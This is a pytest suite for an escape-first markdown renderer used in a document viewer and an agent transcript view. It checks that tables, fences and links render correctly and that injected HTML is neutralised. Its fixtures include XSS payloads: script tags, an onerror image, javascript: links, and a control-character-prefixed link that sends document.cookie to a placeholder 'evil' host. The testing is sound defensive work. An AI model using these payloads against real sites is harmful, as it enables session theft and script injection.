"""Executes mcp_ui/markdown.js (the shared escape-first renderer for the OKF
viewer and the agent transcript) under node against realistic fixtures.

These are the regressions that shipped in the previous inline renderer: the
inline-code pass destroyed fenced blocks, every table row rendered as <th>,
and links/ordered lists/italics/h4+ did not render at all. Each stays pinned
here so the renderer cannot silently regress. These tests run wherever node is
on PATH — including the GitHub-hosted CI runners, whose images ship Node — and
skip only on a node-less machine, so run them locally before landing UI changes.
"""

import shutil
import subprocess
from pathlib import Path

import pytest

NODE = shutil.which("node")
REPO = Path(__file__).resolve().parents[1]
RENDERER = REPO / "mcp_ui" / "markdown.js"

pytestmark = pytest.mark.skipif(
    NODE is None, reason="node is required to execute the browser markdown renderer"
)

HARNESS = """
import { parseMarkdown } from './markdown.mjs';
const chunks = [];
process.stdin.on('data', (chunk) => chunks.push(chunk));
process.stdin.on('end', () => process.stdout.write(parseMarkdown(chunks.join(''))));
"""


@pytest.fixture(name="render")
def render_fixture(tmp_path):
    (tmp_path / "markdown.mjs").write_text(
        RENDERER.read_text(encoding="utf-8"), encoding="utf-8"
    )
    (tmp_path / "harness.mjs").write_text(HARNESS, encoding="utf-8")

    def render(markdown: str) -> str:
        proc = subprocess.run(
            [NODE, str(tmp_path / "harness.mjs")],
            input=markdown.encode("utf-8"),
            capture_output=True,
            timeout=30,
        )
        assert proc.returncode == 0, proc.stderr.decode("utf-8")
        return proc.stdout.decode("utf-8")

    return render


def test_fenced_code_blocks_survive_intact(render):
    out = render('```json\n{"a": 1}\n```')
    assert '<pre><code class="language-json">' in out
    assert "{&quot;a&quot;: 1}" in out
    assert "<code></code>" not in out  # the old inline-pass mangling artifact


def test_inline_code_and_fences_coexist(render):
    out = render("run `grok --check` first\n\n```py\nprint(1)\n```")
    assert "<code>grok --check</code>" in out
    assert '<pre><code class="language-py">print(1)</code></pre>' in out


def test_unterminated_fence_still_renders_as_block(render):
    out = render("```bash\ndocker compose up")
    assert "<pre><code" in out
    assert "docker compose up" in out


def test_table_header_comes_from_separator_row(render):
    out = render("| Layer | Where |\n|--------|:---:|\n| intent | localStorage |")
    assert "<th>Layer</th>" in out
    assert "<td>intent</td>" in out
    assert "--------" not in out  # separator row never renders as cells
    assert out.count("<th>") == 2


def test_table_without_separator_has_no_header(render):
    out = render("| a | b |\n| c | d |")
    assert "<th>" not in out
    assert "<td>a</td>" in out


def test_links_render_and_unsafe_schemes_degrade_to_text(render):
    out = render("[docs](https://example.com/x) and [bad](javascript:alert(1))")
    assert '<a href="https://example.com/x"' in out
    assert 'rel="noopener noreferrer"' in out
    assert "javascript:" not in out
    assert "bad" in out
    assert out.count("<a ") == 1


def test_relative_links_render_but_protocol_relative_do_not(render):
    out = render("[arch](architecture.md) [evil](//evil.example)")
    assert '<a href="architecture.md"' in out
    assert 'href="//evil.example"' not in out


def test_ordered_and_unordered_lists(render):
    out = render("1. first\n2. second\n\n- alpha\n- beta")
    assert "<ol><li>first</li><li>second</li></ol>" in out
    assert "<ul><li>alpha</li><li>beta</li></ul>" in out


def test_emphasis_and_deep_headings(render):
    out = render("#### Deep heading\n\n*italic* and **bold** and ~~gone~~")
    assert "<h4>Deep heading</h4>" in out
    assert "<em>italic</em>" in out
    assert "<strong>bold</strong>" in out
    assert "<del>gone</del>" in out


def test_paragraphs_group_on_blank_lines(render):
    out = render("line one\nline two\n\nline three")
    assert "<p>line one line two</p>" in out
    assert "<p>line three</p>" in out


def test_blockquote_and_horizontal_rule(render):
    out = render("> quoted words\n\n---")
    assert "<blockquote><p>quoted words</p></blockquote>" in out
    assert "<hr />" in out


def test_html_injection_is_escaped_everywhere(render):
    out = render(
        "<img src=x onerror=alert(1)>\n\n"
        "`<script>alert(2)</script>`\n\n"
        "| <b>cell</b> |\n|---|\n| <i>x</i> |\n\n"
        "```html\n<script>alert(3)</script>\n```"
    )
    assert "<img" not in out
    assert "<script" not in out
    assert "&lt;img src=x onerror=alert(1)&gt;" in out
    assert "<code>&lt;script&gt;alert(2)&lt;/script&gt;</code>" in out
    assert "&lt;i&gt;x&lt;/i&gt;" in out


def test_emphasis_inside_inline_code_stays_literal(render):
    out = render("`**not bold**` but **bold**")
    assert "<code>**not bold**</code>" in out
    assert "<strong>bold</strong>" in out


@pytest.mark.parametrize("ctrl", ["\x01", "\x08", "\x1b", "\x1f"])
def test_control_char_prefixed_scheme_does_not_become_a_link(render, ctrl):
    # A leading C0 control char must not smuggle a javascript: URL past the
    # allowlist: browsers strip the control before resolving the scheme, so the
    # renderer strips such chars from source and rejects control-bearing hrefs.
    payload = f"[click]({ctrl}javascript:location='//evil'+document.cookie)"
    out = render(payload)
    assert "<a " not in out
    assert "javascript:" not in out
    assert ctrl not in out  # control char stripped from source entirely


def test_plain_javascript_scheme_link_degrades_to_text(render):
    out = render("[x](javascript:void0) and [ok](https://x.ai/p)")
    assert '<a href="https://x.ai/p"' in out
    assert "javascript:" not in out
    assert out.count("<a ") == 1


def test_midline_triple_backticks_do_not_open_a_code_block(render):
    out = render("Wrap code in ``` fences to format it.\n\nThis stays a paragraph.")
    assert "<pre>" not in out
    assert "<p>This stays a paragraph.</p>" in out


def test_indented_closing_fence_inside_code_does_not_close_early(render):
    out = render("```python\ndef f():\n    return 1\n```")
    assert '<pre><code class="language-python">' in out
    assert "return 1" in out
    assert out.count("<pre>") == 1
    assert "<p>return 1</p>" not in out


def test_table_cell_with_piped_inline_code_keeps_one_column(render):
    # A raw pipe inside an inline-code span must not split the cell.
    out = render("| expr | note |\n|---|---|\n| `a|b` | ok |")
    assert out.count("<td>") == 2  # two body cells, not three
    assert "<code>a|b</code>" in out


def test_escaped_pipe_in_table_cell_renders_literally(render):
    out = render("| a \\| b | c |\n|---|---|\n| 1 | 2 |")
    assert "<th>a | b</th>" in out
    assert out.count("<th>") == 2


def test_okf_corpus_renders_without_mangling_artifacts(render):
    """Every small OKF doc must render fences as <pre> blocks with no
    empty-code-pair artifacts and no visible stray backticks."""
    okf_dir = REPO / "docs" / "okf"
    checked = 0
    for doc in sorted(okf_dir.glob("*.md")):
        text = doc.read_text(encoding="utf-8")
        if len(text) > 50000:
            continue  # the viewer reroutes large files to the plain-text path
        if text.startswith("---"):
            parts = text.split("---")
            if len(parts) >= 3:
                text = "---".join(parts[2:]).strip()
        out = render(text)
        assert "<code></code>" not in out, doc.name
        if "```" in text:
            assert "<pre><code" in out, doc.name
            assert "```" not in out, doc.name
        checked += 1
    assert checked >= 5
